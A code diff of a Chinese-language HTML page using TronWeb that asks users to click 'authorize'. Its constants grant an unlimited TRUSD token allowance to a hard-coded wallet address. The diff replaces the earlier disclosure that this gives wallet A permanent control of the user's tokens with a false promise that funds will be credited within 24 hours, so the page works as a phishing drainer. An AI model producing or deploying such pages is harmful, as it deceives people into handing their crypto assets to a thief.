@@ -2,19 +2,75 @@
 <html lang="zh-Hant">
 <head>
 <meta charset="UTF-8" />
-<title>TRUSD 一鍵授權</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一鍵授權頁面</title>
+<style>
+  body {
+    font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
+    background: #f5f7fa;
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
+  .container {
+    background: white;
+    padding: 30px 40px;
+    border-radius: 12px;
+    box-shadow: 0 6px 12px rgba(0,0,0,0.1);
+    max-width: 400px;
+    width: 100%;
+    text-align: center;
+  }
+  h1 {
+    font-weight: 600;
+    margin-bottom: 16px;
+    color: #2c3e50;
+  }
+  p {
+    font-size: 16px;
+    margin-bottom: 32px;
+    line-height: 1.5;
+  }
+  button {
+    background-color: #3b82f6;
+    color: white;
+    font-size: 18px;
+    padding: 12px 0;
+    width: 100%;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #2563eb;
+  }
+  #status {
+    margin-top: 20px;
+    min-height: 24px;
+    font-size: 14px;
+    color: #555;
+  }
+</style>
 <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-<h2>TRUSD (TRC-20) 一鍵授權頁面</h2>
-<p>請連接你的錢包，點擊授權按鈕，授權 A 錢包永久管理你的 TRUSD。</p>
-<button id="approveBtn">一鍵授權</button>
-<p id="status"></p>
+<div class="container">
+  <h1>一鍵授權頁面</h1>
+  <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>
+  <button id="approveBtn">授權</button>
+  <p id="status"></p>
+</div>
 
 <script>
   const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD TRC-20 合約地址
-  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // 你提供的 A 錢包地址
-  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 2^256-1
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // A 錢包地址
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 無限額
 
   let tronWeb;
 
@@ -49,4 +105,4 @@
 </script>
 </body>
 </html>
-Add TRUSD approve page
+update UI
